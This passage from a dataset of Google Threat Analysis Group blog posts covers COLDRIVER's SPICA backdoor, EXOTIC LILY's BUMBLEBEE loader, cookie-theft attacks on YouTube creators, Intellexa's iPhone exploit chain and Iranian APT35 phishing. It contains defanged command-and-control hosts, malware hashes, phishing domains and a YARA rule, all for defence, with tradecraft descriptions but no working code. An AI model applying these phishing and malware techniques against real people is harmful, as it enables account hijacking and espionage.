c49b4d370ad0dcd1e28ee8f525ac8e3c12a34cfcf62ebb733ec74cca59b29f82 Remote RTF template: - 08f93351d0d3905bee5b0c2b9215d448abb0d3cf49c0f8b666c46df4fcc007cb C2: - word-template[.]net - openxmlformat[.]org - ms-office[.]services - ms-offices[.]com - template-openxml[.]com","num_sentences":35,"metadata":{"source":"blog","platform":"Google_TAG","filename":"apt37"}}
{"id":39,"title":"Russian threat group COLDRIVER expands its targeting of Western officials to include the use of malware","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/google-tag-coldriver-russian-phishing-malware/","clean_text":"Russian threat group COLDRIVER expands its targeting of Western officials to include the use of malware Over the years, TAG has analyzed a range of persistent threats including COLDRIVER (also known as UNC4057, Star Blizzard and Callisto), a Russian threat group focused on credential phishing activities against high profile individuals in NGOs, former intelligence and military officers, and NATO governments.\nFor years, TAG has been countering and reporting on this group’s efforts to conduct espionage aligned with the interests of the Russian government.\nTo add to the community’s understanding of COLDRIVER activity, we’re shining light on their extended capabilities which now includes the use of malware.\nCOLDRIVER continues its focus on credential phishing against Ukraine, NATO countries, academic institutions and NGOs.\nIn order to gain the trust of targets, COLDRIVER often utilizes impersonation accounts, pretending to be an expert in a particular field or somehow affiliated with the target.\nThe impersonation account is then used to establish a rapport with the target, increasing the likelihood of the phishing campaign's success, and eventually sends a phishing link or document containing a link.\nRecently published information on COLDRIVER highlights the group's evolving tactics, techniques and procedures (TTPs), to improve its detection evasion capabilities.\nRecently, TAG has observed COLDRIVER continue this evolution by going beyond phishing for credentials, to delivering malware via campaigns using PDFs as lure documents.\nTAG has disrupted the following campaign by adding all known domains and hashes to Safe Browsing blocklists. “\nEncrypted” lure-based malware delivery As far back as November 2022, TAG has observed COLDRIVER sending targets benign PDF documents from impersonation accounts.\nCOLDRIVER presents these documents as a new op-ed or other type of article that the impersonation account is looking to publish, asking for feedback from the target.\nWhen the user opens the benign PDF, the text appears encrypted.\nScreenshot of “encrypted” text in a lure document If the target responds that they cannot read the encrypted document, the COLDRIVER impersonation account responds with a link, usually hosted on a cloud storage site, to a “decryption” utility for the target to use.\nThis decryption utility, while also displaying a decoy document, is in fact a backdoor, tracked as SPICA, giving COLDRIVER access to the victim’s machine.\nIn 2015 and 2016, TAG observed COLDRIVER using the Scout implant that was leaked during the Hacking Team incident of July 2015.\nSPICA represents the first custom malware that we attribute being developed and used by COLDRIVER.\nSPICA backdoor SPICA is written in Rust, and uses JSON over websockets for command and control (C2).\nIt supports a number of commands including: - Executing arbitrary shell commands - Stealing cookies from Chrome, Firefox, Opera and Edge - Uploading and downloading files - Perusing the filesystem by listing the contents of it - Enumerating documents and exfiltrating them in an archive - There is also a command called “telegram,” but the functionality of this command is unclear Once executed, SPICA decodes an embedded PDF, writes it to disk, and opens it as a decoy for the user.\nIn the background, it establishes persistence and starts the main C2 loop, waiting for commands to execute.\nThe backdoor establishes persistence via an obfuscated PowerShell command which creates a scheduled task named CalendarChecker: Obfuscated PowerShell command TAG has observed SPICA being used as early as September 2023, but believe that COLDRIVER’s use of the backdoor goes back to at least November 2022.\nWhile TAG has observed four different variants of the initial “encrypted” PDF lure, we have only been able to successfully retrieve a single instance of SPICA.\nThis sample, named “Proton-decrypter.exe”, used the C2 address 45.133.216[.]15:3000, and was likely active around August and September 2023.\nWe believe there may be multiple versions of the SPICA backdoor, each with a different embedded decoy document to match the lure document sent to targets.\nProtecting the community As part of our efforts to combat serious threat actors, TAG uses the results of our research to improve the safety and security of Google’s products.\nUpon discovery, all identified websites, domains and files are added to Safe Browsing to protect users from further exploitation.\nTAG also sends all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity and encourages potential targets to enable Enhanced Safe Browsing for Chrome and ensure that all devices are updated.\nWe are committed to sharing our findings with the security community to raise awareness, and with companies and individuals that might have been targeted by these activities.\nWe hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.\nIndicators of compromise (IoCs) Hashes of observed lure documents “Encrypted” PDFs SHA256 0f6b9d2ada67cebc8c0f03786c442c61c05cef5b92641ec4c1bdd8f5baeb2ee1 (first observed November 2022) A949ec428116489f5e77cefc67fea475017e0f50d2289e17c3eb053072adcf24 (first observed June 2023) C97acea1a6ef59d58a498f1e1f0e0648d6979c4325de3ee726038df1fc2e831d (first observed August 2023) Ac270310b5410e7430fe7e36a079525cd8724b002b38e13a6ee6e09b326f4847 (first observed November 2023) SPICA Instance 84523ddad722e205e2d52eedfb682026928b63f919a7bf1ce6f1ad4180d0f507 ZIP file, hosted on cloud storage.\nDelivered to target after initial lure PDF.\n37c52481711631a5c73a6341bd8bea302ad57f02199db7624b580058547fb5a9 SPICA backdoor.\nNamed “Proton-decrypter.exe”.\nC97acea1a6ef59d58a498f1e1f0e0648d6979c4325de3ee726038df1fc2e831d Lure document, likely to provide legitimacy to zip file.\nC2 https[://]45.133.216[.]15:3000/ws YARA Rule rule SPICA__Strings { meta: author = “Google TAG” description = \"Rust backdoor using websockets for c2 and embedded decoy PDF\" hash = \"37c52481711631a5c73a6341bd8bea302ad57f02199db7624b580058547fb5a9\" strings: $s1 = \"os_win.c:%d: (%lu) %s(%s) - %s\" $s2 = \"winWrite1\" $s3 = \"winWrite2\" $s4 = \"DNS resolution panicked\" $s5 = \"struct Dox\" $s6 = \"struct Telegram\" $s8 = \"struct Download\" $s9 = \"spica\" $s10 = \"Failed to open the subkey after setting the value.\"\n$s11 = \"Card Holder: Bull Gayts\" $s12 = \"Card Number: 7/ 3310 0195 4865\" $s13 = \"CVV: 592\" $s14 = \"Card Expired: 03/28\" $a0 = \"agent\\\\src\\\\archive.rs\" $a1 = \"agent\\\\src\\\\main.rs\" $a2 = \"agent\\\\src\\\\utils.rs\" $a3 = \"agent\\\\src\\\\command\\\\dox.rs\" $a4 = \"agent\\\\src\\\\command\\\\shell.rs\" $a5 = \"agent\\\\src\\\\command\\\\telegram.rs\" $a6 = \"agent\\\\src\\\\command\\\\mod.rs\" $a7 = \"agent\\\\src\\\\command\\\\mod.rs\" $a8 = \"agent\\\\src\\\\command\\\\cookie\\\\mod.rs\" $a9 = \"agent\\\\src\\\\command\\\\cookie\\\\browser\\\\mod.rs\" $a10 = \"agent\\\\src\\\\command\\\\cookie\\\\browser\\\\browser_name.rs\" condition: 7 of ($s*) or 5 of ($a*) }","num_sentences":35,"metadata":{"source":"blog","platform":"Google_TAG","filename":"coldriver"}}
{"id":40,"title":"Exposing initial access broker with ties to Conti","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/exposing-initial-access-broker-ties-conti/","clean_text":"Exposing initial access broker with ties to Conti In early September 2021, Threat Analysis Group (TAG) observed a financially motivated threat actor we refer to as EXOTIC LILY, exploiting a 0day in Microsoft MSHTML (CVE-2021-40444).\nInvestigating this group's activity, we determined they are an Initial Access Broker (IAB) who appear to be working with the Russian cyber crime gang known as FIN12 (Mandiant, FireEye) / WIZARD SPIDER (CrowdStrike).\nInitial access brokers are the opportunistic locksmiths of the security world, and it’s a full-time job.\nThese groups specialize in breaching a target in order to open the doors—or the Windows—to the malicious actor with the highest bid.\nEXOTIC LILY is a resourceful, financially motivated group whose activities appear to be closely linked with data exfiltration and deployment of human-operated ransomware such as Conti and Diavol.\nAt the peak of EXOTIC LILY’s activity, we estimate they were sending more than 5,000 emails a day, to as many as 650 targeted organizations globally.\nUp until November 2021, the group seemed to be targeting specific industries such as IT, cybersecurity and healthcare, but as of late we have seen them attacking a wide variety of organizations and industries, with less specific focus.\nWe have observed this threat actor deploying tactics, techniques and procedures (TTPs) that are traditionally associated with more targeted attacks, like spoofing companies and employees as a means of gaining trust of a targeted organization through email campaigns that are believed to be sent by real human operators using little-to-no automation.\nAdditionally and rather uniquely, they leverage legitimate file-sharing services like WeTransfer, TransferNow and OneDrive to deliver the payload, further evading detection mechanisms.\nThis level of human-interaction is rather unusual for cyber crime groups focused on mass scale operations.\nSpoofing Organizations and Identities EXOTIC LILY’s attack chain has remained relatively consistent throughout the time we’ve been tracking the group: One notable technique is the use of domain and identity spoofing as a way of gaining additional credibility with a targeted organization.\nIn the majority of cases, a spoofed domain name was identical to a real domain name of an existing organization, with the only difference being a change of TLD to “.us”, “.co” or “.biz”.\nInitially, the group would create entirely fake personas posing as employees of a real company.\nThat would sometimes consist of creating social media profiles, personal websites and generating a fake profile picture using a public service to create an AI-generated human face.\nIn November 2021, the group began to impersonate real company employees by copying their personal data from social media and business databases such as RocketReach and CrunchBase.\nOne of the fake social media profiles created by EXOTIC LILY Using spoofed email accounts, attackers would then send spear phishing emails under the pretext of a business proposal, such as seeking to outsource a software development project or an information security service.\nExample of an EXOTIC LILY phishing email impersonating as an employee of a legitimate company Attackers would sometimes engage in further communication with the target by attempting to schedule a meeting to discuss the project's design or requirements.\nAt the final stage, the attacker would upload the payload to a public file-sharing service (TransferNow, TransferXL, WeTransfer or OneDrive) and then use a built-in email notification feature to share the file with the target, allowing the final email to originate from the email address of a legitimate file-sharing service and not the attacker’s email, which presents additional detection challenges.\nAttacker uses a file-sharing service email notification feature to send BazarLoader ISO payload Human-Operated Phishing at Scale Further evidence suggests an operator’s responsibilities might include: - customizing the initial “business proposal” templates when first reaching out to a targeted organization; - handling further communications in order to gain affinity and trust; - uploading malware (acquired from another group) to a file-sharing service prior to sharing it with the target.\nA breakdown of the actor’s communication activity shows the operators are working a fairly typical 9-to-5 job, with very little activity during the weekends.\nDistribution of the actor’s working hours suggest they might be working from a Central or an Eastern Europe timezone.\nBreakdown of actor’s communication activity.\nDeeper color indicates more activity.\nMalware and Attribution Although the group came to our attention initially due to its use of documents containing an exploit for CVE-2021-40444, they later switched to the delivery of ISO files with hidden BazarLoader DLLs and LNK shortcuts.\nThese samples have some indicators that suggest they were custom-built to be used by the group.\nFor example, metadata embedded in the LNK shortcuts shows that a number of fields, such as the “Machine Identifier” and “Drive Serial Number” were shared with BazarLoader ISOs distributed via other means, however other fields such as the command line arguments were unique for samples distributed by EXOTIC LILY.\nIn March, the group continued delivering ISO files, but with a DLL containing a custom loader which is a more advanced variant of a first-stage payload previously seen during CVE-2021-40444 exploitation.\nThe loader can be recognized by its use of a unique user-agent “bumblebee” which both variants share.\nThe malware, hence dubbed BUMBLEBEE, uses WMI to collect various system details such as OS version, user name and domain name, which are then exfiltrated in JSON format to a C2.\nIn response, it expects to receive one of the several supported “tasks”, which include execution of shellcode, dropping and running executable files.\nAt the time of the analysis, BUMBLEBEE was observed to fetch Cobalt Strike payloads.\nThis malware can be found using this VirusTotal query.\nEXOTIC LILY activities overlap with a group tracked as DEV-0413 (Microsoft) and were also described by Abnormal in their recent post.\nEarlier reports of attacks exploiting CVE-2021-40444 (by Microsoft and other members of the security community) have also indicated overlaps between domains involved in the delivery chain of an exploit and infrastructure used for BazarLoader and Trickbot distribution.\nWe believe the shift to deliver BazarLoader, along with some other indicators such as a unique Cobalt Strike profile (described by RiskIQ) further confirms the existence of a relationship between EXOTIC LILY and actions of a Russian cyber crime group tracked as WIZARD SPIDER (CrowdStrike), FIN12 (Mandiant, FireEye) and DEV-0193 (Microsoft).\nWhile the nature of those relationships remains unclear, EXOTIC LILY seems to operate as a separate entity, focusing on acquiring initial access through email campaigns, with follow-up activities that include deployment of Conti and Diavol ransomware, which are performed by a different set of actors.\nImproving User Protection As part of our efforts to combat serious threat actors, we use results of our research to improve the safety and security of our products.\nIn collaboration with Gmail and Safe Browsing, we are improving protections by adding additional warnings for emails originating from website contact forms, better identification of spoofing, and adjusting the reputation of email file sharing notifications.\nAdditionally, we’re working with Google’s CyberCrime Investigation Group to share relevant details and indicators with law enforcement.\nTAG is committed to sharing our findings as a way of raising awareness with the security community, and with companies and individuals that might have been targeted or suffered from this threat actor’s activities.\nWe hope that improved understanding of the group’s tactics and techniques will enhance threat hunting capability and lead to stronger user protections across industry.\nIndicators of Compromise (IOCs) Recent domains used in email campaigns: - conlfex[.]com - avrobio[.]co - elemblo[.]com - phxmfg[.]co - modernmeadow[.]co - lsoplexis[.]com - craneveyor[.]us - faustel[.]us - lagauge[.]us - missionbio[.]us - richllndmetals[.]com - kvnational[.]us - prmflltration[.]com - brightlnsight[.]co - belcolnd[.]com - awsblopharma[.]com - amevida[.]us - revergy[.]us - al-ghurair[.]us - opontia[.]us BazarLoader ISO samples: - 5ceb28316f29c3912332065eeaaebf59f10d79cd9388ef2a7802b9bb80d797be - 9fdec91231fe3a709c8d4ec39e25ce8c55282167c561b14917b52701494ac269 - c896ee848586dd0c61c2a821a03192a5efef1b4b4e03b48aba18eedab1b864f7 Recent BUMBLEBEE ISO samples: - 9eacade8174f008c48ea57d43068dbce3d91093603db0511467c18252f60de32 - 6214e19836c0c3c4bc94e23d6391c45ad87fdd890f6cbd3ab078650455c31dc8 - 201c4d0070552d9dc06b76ee55479fc0a9dfacb6dbec6bbec5265e04644eebc9 - 1fd5326034792c0f0fb00be77629a10ac9162b2f473f96072397a5d639da45dd - 01cc151149b5bf974449b00de08ce7dbf5eca77f55edd00982a959e48d017225 Recent BUMBLEBEE C2: - 23.81.246[.]187:443","num_sentences":42,"metadata":{"source":"blog","platform":"Google_TAG","filename":"conti"}}
{"id":41,"title":"Phishing campaign targets YouTube creators with cookie theft malware","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/phishing-campaign-targets-youtube-creators-cookie-theft-malware/","clean_text":"Phishing campaign targets YouTube creators with cookie theft malware Google’s Threat Analysis Group tracks actors involved in disinformation campaigns, government backed hacking, and financially motivated abuse.\nSince late 2019, our team has disrupted financially motivated phishing campaigns targeting YouTubers with Cookie Theft malware.\nThe actors behind this campaign, which we attribute to a group of hackers recruited in a Russian-speaking forum, lure their target with fake collaboration opportunities (typically a demo for anti-virus software, VPN, music players, photo editing or online games), hijack their channel, then either sell it to the highest bidder or use it to broadcast cryptocurrency scams.\nIn collaboration with YouTube, Gmail, Trust & Safety, CyberCrime Investigation Group and Safe Browsing teams, our protections have decreased the volume of related phishing emails on Gmail by 99.6% since May 2021.\nWe blocked 1.6M messages to targets, displayed ~62K Safe Browsing phishing page warnings, blocked 2.4K files, and successfully restored ~4K accounts.\nWith increased detection efforts, we’ve observed attackers shifting away from Gmail to other email providers (mostly email.cz, seznam.cz, post.cz and aol.com).\nMoreover, to protect our users, we have referred the below activity to the FBI for further investigation.\nIn this blog, we share examples of the specific tactics, techniques and procedures (TTPs) used to lure victims, as well as some guidance on how users can further protect themselves.\nTactics, techniques and procedures Cookie Theft, also known as “pass-the-cookie attack,” is a session hijacking technique that enables access to user accounts with session cookies stored in the browser.\nWhile the technique has been around for decades, its resurgence as a top security risk could be due to a wider adoption of multi-factor authentication (MFA) making it difficult to conduct abuse, and shifting attacker focus to social engineering tactics.\nSocial engineering YouTubers with advertisement offer Many YouTube creators provide an email address on their channel for business opportunities.\nIn this case, the attackers sent forged business emails impersonating an existing company requesting a video advertisement collaboration.\nExample phishing email message The phishing typically started with a customized email introducing the company and its products.\nOnce the target agreed to the deal, a malware landing page disguised as a software download URL was sent via email or a PDF on Google Drive, and in a few cases, Google documents containing the phishing links.\nAround 15,000 actor accounts were identified, most of which were created for this campaign specifically.\nFake software landing pages and social media accounts The attackers registered various domains associated with forged companies and built multiple websites for malware delivery.\nTo date, we’ve identified at least 1,011 domains created solely for this purpose.\nSome of the websites impersonated legitimate software sites, such as Luminar, Cisco VPN, games on Steam, and some were generated using online templates.\nDuring the pandemic, we also uncovered attackers posing as news providers with a “Covid19 news software.”\nLure message and landing pages for the forged covid news software.\nIn one case, we observed a fake social media page copying content from an existing software company.\nThe following screenshot is an example of a fake page where the original URL is replaced with one leading to a cookie theft malware download.\nOriginal (left) and fake (right) instagram accounts Because Google actively detects and disrupts phishing links sent via Gmail, the actors were observed driving targets to messaging apps like WhatsApp, Telegram or Discord.\nDelivering cookie theft malware Once the target runs the fake software, a cookie stealing malware executes, taking browser cookies from the victim’s machine and uploading them to the actor's command & control servers.\nAlthough this type of malware can be configured to be persistent on the victim's machine, these actors are running all malware in non-persistent mode as a smash-and-grab technique.\nThis is because if the malicious file is not detected when executed, there are less artifacts on an infected host and therefore security products fail to notify the user of a past compromise.\nWe have observed that actors use various types of malware based on personal preference, most of which are easily available on Github.\nSome commodity malware used included RedLine, Vidar, Predator The Thief, Nexus stealer, Azorult, Raccoon, Grand Stealer, Vikro Stealer, Masad (Google’s naming), and Kantal (Google’s naming) which shares code similarity with Vidar.\nOpen source malware like Sorano and AdamantiumThief were also observed.\nRelated hashes are listed in the Technical Details section, at the end of this report.\nMost of the observed malware was capable of stealing both user passwords and cookies.\nSome of the samples employed several anti-sandboxing techniques including enlarged files, encrypted archive and download IP cloaking.\nA few were observed displaying a fake error message requiring user click-through to continue execution.\nFake error window require user click through Cryptocurrency scams and channel selling A large number of hijacked channels were rebranded for cryptocurrency scam live-streaming.\nThe channel name, profile picture and content were all replaced with cryptocurrency branding to impersonate large tech or cryptocurrency exchange firms.\nThe attacker live-streamed videos promising cryptocurrency giveaways in exchange for an initial contribution.\nOn account-trading markets, hijacked channels ranged from $3 USD to $4,000 USD depending on the number of subscribers.\nHack-for-Hire attackers These campaigns were carried out by a number of hack-for-hire actors recruited on Russian-speaking forums via the following job description, offering two types of work: This recruitment model explains the highly customized social engineering, as well as the varied malware types given each actor's choice of preferred malware.\nProtecting our users from attacks We are continuously improving our detection methods and investing in new tools and features that automatically identify and stop threats like this one.\nSome of these improvements include: - Additional heuristic rules to detect and block phishing & social engineering emails, cookie theft hijacking and crypto-scam livestreams. -\nSafe Browsing is further detecting and blocking malware landing pages and downloads. -\nYouTube has hardened channel transfer workflows, detected and auto-recovered over 99% of hijacked channels. -\nAccount Security has hardened authentication workflows to block and notify the user on potential sensitive actions.\nSensitive action blocked in account It is also important that users remain aware of these types of threats and take appropriate action to further protect themselves.\nOur recommendations: - Take Safe Browsing warnings seriously.\nTo avoid malware triggering antivirus detections, threat actors social engineer users into turning off or ignoring warnings. -\nBefore running software, perform virus scanning using an antivirus or online virus scanning tool like VirusTotal to verify file legitimacy. -\nEnable the “Enhanced Safe Browsing Protection” mode in your Chrome browser, a feature that increases warnings on potentially suspicious web pages & files. -\nBe aware of encrypted archives which are often bypassing antivirus detection scans, increasing the risk of running malicious files. -\nProtect your account with 2-Step-verification (multi-factor authentication) which provides an extra layer of security to your account in case your password is stolen.\nStarting November 1, monetizing YouTube creators must turn on 2-Step Verification on the Google Account used for their YouTube channel to access YouTube Studio or YouTube Studio Content Manager.\nAdditional resources: Avoid & Report Phishing Emails.\nTechnical Details Related Malware hashes: - RedLine (commodity) - 501fe2509581d43288664f0d2825a6a47102cd614f676bf39f0f80ab2fd43f2c - c8b42437ffd8cfbbe568013eaaa707c212a2628232c01d809a3cf864fe24afa8 - Vidar (commodity) - 9afc029ac5aa525e6fdcedf1e93a64980751eeeae3cf073fcbd1d223ab5c96d6 - Kantal (share code similarity with Vidar) - F59534e6d9e0559d99d2b3a630672a514dbd105b0d6fc9447d573ebd0053caba (zip archive) - Edea528804e505d202351eda0c186d7c200c854c41049d7b06d1971591142358 (unpacked sample) - Predator The Thief (commodity) - 0d8cfa02515d504ca34273d8cfbe9d1d0f223e5d2cece00533c48a990fd8ce72 (zip archive) - Sorano (open source) - c7c8466a66187f78d953c64cbbd2be916328085aa3c5e48fde6767bc9890516b - Nexus stealer (commodity) - ed8b2af133b4144bef2b89dbec1526bf80cc06fe053ece1fa873f6bd1e99f0be - efc88a933a8baa6e7521c8d0cf78c52b0e3feb22985de3d35316a8b00c5073b3 - Azorult (commodity) - 8cafd480ac2a6018a4e716a4f9fd1254c4e93501a84ee1731ed7b98b67ab15dd - Raccoon (commodity) - 85066962ba1e8a0a8d6989fffe38ff564a6cf6f8a07782b3fbc0dcb19d2497cb - Grand Stealer (commodity) - 6359d5fa7437164b300abc69c8366f9481cb91b7558d68c9e3b0c2a535ddc243 - Vikro Stealer (commodity) - 04deb8d8aee87b24c7ba0db55610bb12f7d8ec1e75765650e5b2b4f933b18f6d - Masad (commodity) - 6235573d8d178341dbfbead7c18a2f419808dc8c7c302ac61e4f9645d024ed85 - AdamantiumThief (open source) - Db45bb99c44a96118bc5673a7ad65dc2a451ea70d4066715006107f65d906715 Top Phishing Domains: - pro-swapper[.]com - downloadnature[.]space - downloadnature[.]com - fast-redirect[.]host - bragi-studio[.]com - plplme[.]site - fenzor[.]com - universe-photo[.]com - rainway-gaming[.]com - awaken1337[.]xyz - pixelka[.]fun - vortex-cloudgaming[.]com - vontex[.]tech - user52406.majorcore[.]space - voneditor[.]tech - spaceditor[.]space - roudar[.]com - peoplep[.]site - anypon[.]online - zeneditor[.]tech - yourworld[.]site - playerupbo[.]xyz - dizzify[.]me","num_sentences":53,"metadata":{"source":"blog","platform":"Google_TAG","filename":"cookie-theft"}}
{"id":42,"title":"0-days exploited by commercial surveillance vendor in Egypt","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/0-days-exploited-by-commercial-surveillance-vendor-in-egypt/","clean_text":"0-days exploited by commercial surveillance vendor in Egypt Last week Google’s Threat Analysis Group (TAG), in partnership with The Citizen Lab, discovered an in-the-wild 0-day exploit chain for iPhones.\nDeveloped by the commercial surveillance vendor, Intellexa, this exploit chain is used to install its Predator spyware surreptitiously onto a device.\nIn response, yesterday, Apple patched the bugs in iOS 16.7 and iOS 17.0.1 as CVE-2023-41991, CVE-2023-41992, CVE-2023-41993.\nThis quick patching from Apple helps to better protect users and we encourage all iOS users to install them as soon as possible.\nExploit delivery via man-in-the-middle (MITM) The Intellexa exploit chain was delivered via a “man-in-the-middle” (MITM) attack, where an attacker is in between the target and the website they’re trying to reach.\nIf the target is going to a website using ‘http’, then the attacker can intercept the traffic and send fake data back to the target to force them to a different website.\nVisiting a website using ‘https’ means that the traffic is encrypted, and it is easily verifiable that the received data came from the intended website using their certificate.\nThat is not the case when using ‘http’.\nIn the case of this campaign, if the target went to any ‘http’ site, the attackers injected traffic to silently redirect them to an Intellexa site, c.betly[.]me.\nIf the user was the expected targeted user, the site would then redirect the target to the exploit server, sec-flare[.]com.\nWhile there’s a spotlight on “0-click” vulnerabilities (bugs that don’t require user interaction) this MITM delivery also didn’t require the user to open any documents, click a specific link, or answer any phone calls.\niOS Exploit Chain As soon as the attacker redirected the target to their exploit server, the exploit chain began to execute.\nFor iOS, this chain included three vulnerabilities: - CVE-2023-41993: Initial remote code execution (RCE) in Safari - CVE-2023-41991: Certificate validation issue - CVE-2023-41992: Local privilege escalation (LPE) in the XNU Kernel The chain then ran a small binary to decide whether or not to install the full Predator implant.\nHowever, TAG was unable to capture the full Predator implant.\nWe plan to publish a technical deep dive on these exploits in line with the Google vulnerability disclosure policy.\nAndroid Exploit Chain The attacker also had an exploit chain to install Predator on Android devices in Egypt.\nTAG observed these exploits delivered in two different ways: the MITM injection and via one-time links sent directly to the target.\nWe were only able to obtain the initial renderer remote code execution vulnerability for Chrome, which was exploiting CVE-2023-4762.\nThis bug had already been separately reported to the Chrome Vulnerability Rewards Program by a security researcher and was patched on September 5th.\nWe assess that Intellexa was also previously using this vulnerability as a 0-day.\nChrome's work to protect against MITM For years, Chrome has worked toward universal HTTPS adoption across the web.\nAdditionally Chrome has an “HTTPS-First Mode” that can reduce the likelihood of exploits being delivered via MITM network injection. \"\nHTTPS-First Mode\" will attempt to load all pages over HTTPS, and show a large warning before falling back to sending an HTTP request.\nThis setting is currently on by default for users enrolled in the Advanced Protection Program who are also signed into Chrome.\nWe encourage all users to enable “HTTPS-First Mode” to better protect themselves from MITM attacks.\nConclusion This campaign is yet another example of the abuses caused by the proliferation of commercial surveillance vendors and their serious risk to the safety of online users.\nTAG will continue to take action against, and publish research about, the commercial spyware industry, as well as work across the public and private sectors to push this work forward.\nWe would like to acknowledge and thank The Citizen Lab for their collaboration and partnership in the capturing and analysis of these exploits, and Apple for deploying a timely patch for the safety of online users.","num_sentences":28,"metadata":{"source":"blog","platform":"Google_TAG","filename":"egypt"}}
{"id":43,"title":"Countering threats from Iran","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/countering-threats-iran/","clean_text":"Countering threats from Iran Google’s Threat Analysis Group tracks actors involved in disinformation campaigns, government backed hacking, and financially motivated abuse.\nWe have a long-standing policy to send you a warning if we detect that your account is a target of government-backed phishing or malware attempts.\nSo far in 2021, we’ve sent over 50,000 warnings, a nearly 33% increase from this time in 2020.\nThis spike is largely due to blocking an unusually large campaign from a Russian actor known as APT28 or Fancy Bear.\nWe intentionally send these warnings in batches to all users who may be at risk, rather than at the moment we detect the threat itself, so that attackers cannot track our defense strategies.\nOn any given day, TAG is tracking more than 270 targeted or government-backed attacker groups from more than 50 countries.\nThis means that there is typically more than one threat actor behind the warnings.\nIn this blog, we explore some of the most notable campaigns we’ve disrupted this year from a different government-backed attacker: APT35, an Iranian group, which regularly conducts phishing campaigns targeting high risk users.\nThis is the one of the groups we disrupted during the 2020 US election cycle for its targeting of campaign staffers.\nFor years, this group has hijacked accounts, deployed malware, and used novel techniques to conduct espionage aligned with the interests of the Iranian government.\nHijacked websites used for credential phishing attacks In early 2021, APT35 compromised a website affiliated with a UK university to host a phishing kit.\nAttackers sent email messages with links to this website to harvest credentials for platforms such as Gmail, Hotmail, and Yahoo.\nUsers were instructed to activate an invitation to a (fake) webinar by logging in.\nThe phishing kit will also ask for second-factor authentication codes sent to devices.\nAPT35 has relied on this technique since 2017 — targeting high-value accounts in government, academia, journalism, NGOs, foreign policy, and national security.\nCredential phishing through a compromised website demonstrates these attackers will go to great lengths to appear legitimate – as they know it's difficult for users to detect this kind of attack.\nPhishing page hosted on a compromised website Utilization of Spyware Apps In May 2020, we discovered that APT35 attempted to upload spyware to the Google Play Store.\nThe app was disguised as VPN software that, if installed, could steal sensitive information such as call logs, text messages, contacts, and location data from devices.\nGoogle detected the app quickly and removed it from the Play Store before any users had a chance to install it.\nAlthough Play Store users were protected, we are highlighting the app here as TAG has seen APT35 attempt to distribute this spyware on other platforms as recently as July 2021.\nSpyware app disguised as a VPN utility Conference-themed phishing emails One of the most notable characteristics of APT35 is their impersonation of conference officials to conduct phishing attacks.\nAttackers used the Munich Security and the Think-20 (T20) Italy conferences as lures in non-malicious first contact email messages to get users to respond.\nWhen they did, attackers sent them phishing links in follow-on correspondence.\nTargets typically had to navigate through at least one redirect before landing on a phishing domain.\nLink shorteners and click trackers are heavily used for this purpose, and are oftentimes embedded within PDF files.\nWe’ve disrupted attacks using Google Drive, App Scripts, and Sites pages in these campaigns as APT35 tries to get around our defenses.\nServices from Dropbox and Microsoft are also abused.\nGoogle Sites page disguised as a Google Form to redirect to a phishing site Telegram for threat actor notifications One of APT35’s novel techniques involves using Telegram for operator notifications.\nThe attackers embed javascript into phishing pages that notify them when the page has been loaded.\nTo send the notification, they use the Telegram API sendMessage function, which lets anyone use a Telegram bot to send a message to a public channel.\nThe attackers use this function to relay device-based data to the channel, so they can see details such as the IP, useragent, and locales of visitors to their phishing sites in real-time.\nWe reported the bot to Telegram and they have taken action to remove it.\nPublic Telegram channel used for attacker notifications How we keep users safe from these threats We warn users when we suspect a government-backed threat like APT35 is targeting them.\nThousands of these warnings are sent every month, even in cases where the corresponding attack is blocked.\nIf you receive a warning it does not mean your account has been compromised, it means you have been identified as a target.\nWorkspace administrators are also notified regarding targeted accounts in their domain.\nUsers are encouraged to take these warnings seriously and consider enrolling in the Advanced Protection Program or enabling two-factor authentication if they haven't already.\nWe also block malicious domains using Google Safe Browsing – a service that Google's security team built to identify unsafe websites across the web and notify users and website owners of potential harm.\nWhen a user of a Safe Browsing-enabled browser or app attempts to access unsafe content on the web, they’ll see a warning page explaining that the content they’re trying to access may be harmful.\nWhen a site identified by Safe Browsing as harmful appears in Google Search results, we show a warning next to it in the results.\nThreat Analysis Group will continue to identify bad actors and share relevant information with others in the industry, with the goal of bringing awareness to these issues, protecting you and fighting bad actors to prevent future attacks.\nTechnical Details Indicators from APT28 phishing campaign: service-reset-password-moderate-digital.rf[.]gd reset-service-identity-mail.42web[.]io digital-email-software.great-site[.]net Indicators from APT35 campaigns: Abused Google Properties: https://sites.google[.]com/view/ty85yt8tg8-download-rtih4ithr/ https://sites.google[.]com/view/user-id-568245/ https://sites.google[.]com/view/hhbejfdwdhwuhscbsb-xscvhdvbc/ Abused Dropbox Properties: https://www.dropbox[.]com/s/68y4vpfu8pc3imf/Iraq&Jewish.pdf Phishing Domains: nco2[.]live summit-files[.]com filetransfer[.]club continuetogo[.]me accessverification[.]online customers-verification-identifier[.]site service-activity-session[.]online identifier-service-review[.]site recovery-activity-identification[.]site review-session-confirmation[.]site recovery-service-activity[.]site verify-service-activity[.]site service-manager-notifications[.]info Android App: Android App C2: communication-shield[.]site cdsa[.]xyz","num_sentences":42,"metadata":{"source":"blog","platform":"Google_TAG","filename":"iran"}}
{"id":44,"title":"New Iranian APT data extraction tool","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/new-iranian-apt-data-extraction-tool/","clean_text":"New Iranian APT data extraction tool As part of TAG's mission to counter serious threats to Google and our users, we've analyzed a range of persistent threats including APT35 and Charming Kitten, an Iranian government-backed group that regularly targets high risk users.\nFor years, we have been countering this group’s efforts to hijack accounts, deploy malware, and their use of novel techniques to conduct espionage aligned with the interests of the Iranian government.\nNow, we’re shining light on a new tool of theirs.\nIn December 2021, TAG discovered a novel Charming Kitten tool, named HYPERSCRAPE, used to steal user data from Gmail, Yahoo!,\nand Microsoft Outlook accounts.\nThe attacker runs HYPERSCRAPE on their own machine to download victims’ inboxes using previously acquired credentials.\nWe have seen it deployed against fewer than two dozen accounts located in Iran.\nThe oldest known sample is from 2020, and the tool is still under active development.\nWe have taken actions to re-secure these accounts and have notified the victims through our Government Backed Attacker Warnings.\nThis post will provide technical details about HYPERSCRAPE, similar to PWC’s recently published 